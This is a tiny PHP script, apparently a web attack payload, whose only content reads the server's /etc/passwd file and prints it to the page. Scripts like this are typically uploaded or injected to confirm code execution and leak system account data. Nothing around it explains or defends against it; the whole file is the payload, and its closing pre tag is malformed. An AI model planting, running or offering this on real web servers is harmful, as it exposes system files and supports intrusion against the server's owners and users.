<?php
  echo "<pre>".file_get_contents( "/etc/passwd" )."<pre>";
?>
